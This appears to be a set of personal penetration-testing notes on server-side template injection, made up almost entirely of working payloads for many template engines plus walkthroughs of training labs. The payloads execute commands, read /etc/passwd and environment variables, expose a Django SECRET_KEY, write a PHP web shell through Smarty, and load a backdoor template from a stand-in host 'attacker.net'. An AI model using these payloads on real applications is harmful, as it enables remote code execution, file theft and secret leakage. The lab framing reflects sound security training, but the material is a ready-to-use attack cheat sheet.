![[Pasted image 20240112131652.png]]
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
Use the intruder to test payloads
check errors and move forward, search for exploits, etc.
```
Polyglot:
${{<%[%'"}}%\

FreeMarker (Java):
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }

(Java):
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

Twig (PHP):
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}

Smarty (PHP):
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

Handlebars (NodeJS):
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

Velocity:
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

ERB (Ruby):
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>

Django Tricks (Python):
{% debug %}
{{settings.SECRET_KEY}}

Tornado (Python):
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}

Mojolicious (Perl):
<%= perl code %>
<% perl code %>

Flask/Jinja2: Identify:
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}

Flask/Jinja2: 
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

Jade:
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

Razor (.Net):
@(1+2)
@{// C# code}
```
ERB
```
<%= system('cat /etc/passwd') %>
```

---------- lab stuff
##### # Basic server-side template injection (code context)
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
Tornado (Python)
```
{% import foobar %} = Error
{% import os %}

{% import os %}
{{os.system('whoami')}}
```


##### # Server-side template injection using documentation
${} = freemarker
```
<#assign ex="freemarker.template.utility.Execute"?new()> 
{ ex("id") }
```

##### Server-side template injection in an unknown language with a documented exploit
Experiment by injecting a fuzz string containing tem![[Pasted image 20240112131649.png]]plate syntax from various different template languages, such as `${{<%[%'"}}%\`, into the `message` parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.
https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
```
wrtz{{#with "s" as |string|}} 
	{{#with "e"}} 
		{{#with split as |conslist|}} 
			{{this.pop}} 
			{{this.push (lookup string.sub "constructor")}} 
			{{this.pop}} 
				{{#with string.split as |codelist|}} 
				{{this.pop}} 
				{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} 
				{{this.pop}} 
				{{#each conslist}} 
					{{#with (string.sub.apply 0 codelist)}} 
						{{this}} 
					{{/with}} 
				{{/each}} 
			{{/with}} 
		{{/with}} 
	{{/with}} 
{{/with}}
```
 URL encode it and paste it in ?message=

##### Server-side template injection with information disclosure via user-supplied objects
1. Log in and edit one of the product description templates.
2. Change one of the template expressions to something invalid, such as a fuzz string `${{<%[%'"}}%\`, and save the template. The error message in the output hints that the Django framework is being used.
3. Study the Django documentation and notice that the built-in template tag `debug` can be called to display debugging information.
4. In the template, remove your invalid syntax and enter the following statement to invoke the `debug` built-in:
5. `{% debug %}`
6. Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the `settings` object.
7. Study the `settings` object in the Django documentation and notice that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
8. In the template, remove the `{% debug %}` statement and enter the expression `{{settings.SECRET_KEY}}`
9. Save the template to output the framework's secret key.
10. Click the "Submit solution" button and submit the secret key to solve the lab.
